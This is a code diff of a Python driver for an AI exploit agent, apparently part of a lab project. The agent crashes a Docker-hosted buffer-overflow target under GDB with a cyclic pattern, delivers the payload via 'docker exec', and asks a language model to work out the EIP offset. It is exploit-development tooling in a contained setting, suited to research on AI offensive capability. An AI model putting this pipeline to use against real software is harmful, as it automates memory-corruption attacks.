@@ -3,7 +3,7 @@ import os
 import time
 import json
 import socket
-import subprocess
+import subprocess # <-- THIS IS THE FIX
 from dotenv import load_dotenv
 from agent import ExploitAgent
 
@@ -11,8 +11,10 @@ load_dotenv()
 
 TARGET_HOST = 'target'
 TARGET_PORT = 8080
+TARGET_CONTAINER_NAME = 'buffcy-minimal-target-1' # Default docker-compose name
 
 class GDBClient:
+    # ... (GDBClient class remains the same) ...
     def __init__(self, host, port):
         self.host = host
         self.port = port
@@ -34,13 +36,9 @@ class GDBClient:
         if not self.sock: self.connect()
         request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
         print(f"[AGENT] Sending command to server: {method}")
-        # Add a newline delimiter to mark the end of the message
         self.sock.sendall(json.dumps(request).encode() + b'\n')
-
-        # Read from the socket until we have a full newline-terminated message
         while b'\n' not in self.buffer:
-            self.buffer += self.sock.recv(1024)
-        
+            self.buffer += self.sock.recv(4096)
         message_data, self.buffer = self.buffer.split(b'\n', 1)
         response = json.loads(message_data.decode())
         print(f"[AGENT] Received response from server: {response}")
@@ -50,7 +48,6 @@ class GDBClient:
         if self.sock: self.sock.close()
 
 def main(target_binary, aslr_mode):
-    # This main logic remains the same as before
     print(f"***** AGENT STARTING EXPLOIT AGAINST: {target_binary} (ASLR: {aslr_mode.upper()}) *****")
 
     agent = ExploitAgent(model_name="openai/gpt-4o")
@@ -60,26 +57,28 @@ def main(target_binary, aslr_mode):
         print("\n--- 🚀 PHASE 1: Finding EIP Offset ---")
         gdb_client.connect()
         
+        # 1. Tell GDB to run the program
         gdb_client.send_command('run')
-        print("[AGENT] Target program is running inside GDB. Waiting for initialization...")
+        print("[AGENT] Target program is running. Waiting for initialization...")
         time.sleep(3) 
 
+        # 2. Generate payload
         pattern = agent.generate_cyclic_pattern(1200)
-        print(f"[AGENT] Generated a {len(pattern)}-byte cyclic pattern.")
+        print(f"[AGENT] Generated a {len(pattern)}-byte pattern.")
 
-        print("[AGENT] Starting DNS spoofer inside target container...")
-        spoofer_command = f"python3 dns_spoofer.py --payload {pattern.encode().hex()} &"
-        gdb_client.send_command('execute_shell', {'command': spoofer_command})
-        time.sleep(1)
-
-        print("[AGENT] Triggering exploit with 'dig' inside target container...")
-        gdb_client.send_command('execute_shell', {'command': 'dig @127.0.0.1 dos.com'})
+        # 3. Use 'docker exec' to run the delivery script inside the target container
+        print("[AGENT] Commanding target to deliver payload...")
+        delivery_command = f"docker exec {TARGET_CONTAINER_NAME} python3 deliver_payload.py --payload {pattern.encode().hex()}"
+        subprocess.run(delivery_command, shell=True, capture_output=True)
+        print("[AGENT] Payload delivery command sent.")
         
+        # 4. Ask the GDB server to run the program and get the crash report.
         print("[AGENT] Waiting for crash report from GDB...")
-        crash_info = gdb_client.send_command('get_crash_info')
+        crash_info = gdb_client.send_command('run_and_get_crash_info')
         
         if crash_info.get("status") == "crashed":
-            print("[AGENT] Crash confirmed. Analyzing registers...")
+            print("[AGENT] Crash confirmed. Now calling AI for analysis...")
+            # This is the step that will fail if your API key has no credits.
             offset = agent.analyze_crash_and_get_offset(crash_info, len(pattern))
             print(f"--- ✅ SUCCESS: Agent determined offset is: {offset} ---")
         else:
